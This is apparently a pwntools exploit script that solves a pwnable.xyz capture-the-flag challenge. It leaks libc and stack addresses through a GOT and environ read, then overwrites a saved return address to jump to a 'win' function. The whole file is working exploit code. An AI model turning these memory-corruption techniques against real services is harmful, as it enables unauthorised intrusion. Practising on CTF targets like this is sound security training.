#!/usr/bin/python 
from pwn import *

p = remote("svc.pwnable.xyz", 30019)
libc = ELF("./alpine-libc-2.28.so")
#p = process("./challenge")
elf = ELF("./challenge")
#libc = elf.libc

#gdb.attach(p)
p.sendafter("> ", '1')
p.sendafter("Addr: ", str(elf.got['setvbuf']))
setvbuf = u64(p.recvuntil("\x7f") + "\x00\x00")
libcBase = setvbuf - libc.symbols['setvbuf']
environ_ptr = libcBase + libc.symbols['environ']

p.sendafter("> ", '1')
p.sendafter("Addr: ", str(environ_ptr))
environ = u64(p.recvuntil("\x7f") + "\x00\x00")
rbp = environ - 248
ret = rbp + 8

p.sendafter("> ", '2')
p.sendafter("Addr: ", str(ret))
p.sendafter("Value: ", str(elf.symbols['win']))

p.sendafter("> ", '0')

p.interactive()
